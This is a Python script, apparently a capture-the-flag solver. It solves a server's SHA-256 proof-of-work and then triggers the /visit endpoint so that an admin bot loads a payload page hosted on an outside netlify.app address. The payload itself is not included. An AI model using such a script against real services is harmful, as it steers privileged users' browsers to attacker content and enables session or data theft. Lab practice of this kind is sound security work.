#!/usr/bin/env python3
import hashlib
import requests
import sys
import time

# Config
TARGET = "http://127.0.0.1:5000"
PAYLOAD_URL = "http://darling-heliotrope-3eeb1c.netlify.app/"  # Thay bằng URL bạn host payload
SESSION = requests.Session()

def get_challenge():
    r = SESSION.get(f"{TARGET}/get_challenge")
    r.raise_for_status()
    data = r.json()
    return data["challenge"]

def solve_pow(challenge, prefix="000000"):
    print(f"[+] Solving PoW for challenge {challenge} …")
    nonce = None
    for i in range(10**8):
        s = challenge + str(i)
        h = hashlib.sha256(s.encode()).hexdigest()
        if h.startswith(prefix):
            nonce = str(i)
            print(f"[+] Found nonce: {nonce} (hash {h})")
            break
    if nonce is None:
        raise RuntimeError("PoW failed")
    return nonce

def trigger_visit(nonce):
    print(f"[+] Triggering /visit?url={PAYLOAD_URL}&nonce={nonce}")
    params = {"url": PAYLOAD_URL, "nonce": nonce}
    r = SESSION.get(f"{TARGET}/visit", params=params)
    if r.status_code == 200:
        print("[+] Admin is visiting your payload page!")
    else:
        print(f"[-] visit failed ({r.status_code}): {r.text}")

def main():
    # 1. Lấy challenge
    challenge = get_challenge()

    # 2. Giải PoW
    nonce = solve_pow(challenge)

    # 3. Gửi /visit
    trigger_visit(nonce)

if __name__ == "__main__":
    main()
